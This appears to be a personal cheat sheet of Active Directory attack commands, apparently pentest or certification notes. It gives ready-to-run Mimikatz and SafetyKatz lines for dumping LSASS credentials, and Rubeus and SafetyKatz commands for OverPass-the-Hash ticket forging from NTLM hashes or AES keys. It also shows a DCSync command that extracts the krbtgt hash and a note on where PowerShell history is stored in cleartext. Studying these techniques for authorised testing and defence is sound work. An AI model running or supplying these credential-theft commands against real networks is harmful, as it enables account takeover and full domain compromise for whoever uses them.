# PSReadLineOption

- handles all line colors in PowerShell -- not handled by Microsoft
- stores all PowerShell commands in cleartext in `C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine`


# SAM, LSASS, DPAPI



# Mimikatz

dump credentials
`mimikatz.exe -Command '"sekurlsa::ekeys"'`

using SafetyKatz (minidump of LSASS and PELoader)
`SafetyKatz.exe "sekurlsa::ekeys"`

from a linux machine using impacket


# OverPass-The-Hash

generate tokens from hashes or keys (needs administrator)
`SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:<DOMAIN> /aes256:<aes_key> /run:cmd.exe" "exit"`
- logon type 9 (same as runas /netonly)
	- [Logon Types](https://www.alteredsecurity.com/post/fantastic-windows-logon-types-and-where-to-find-credentials-in-them)
- PtH uses local credentials, OverPass-the-Hash creates Kerberos tickets and keys

execute OPtH without administrator access using Rubeus (overwrites current tickets)
`Rubeus.exe asktgt /user:administrator  /rc4:<ntlm_hash> /ptt`

using Rubeus with elevation
`Rubeus.exe asktgt /user:administrator /aes256:<aes_key> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt`


# DCSync

extract creds without executing code on the DC`
```
SafetyKatz.exe "lsadump::dcsync /user:<DOMAIN>\krbtgt
exit
```
- domain admin, enterprise admin, or domain controller privileges are required by default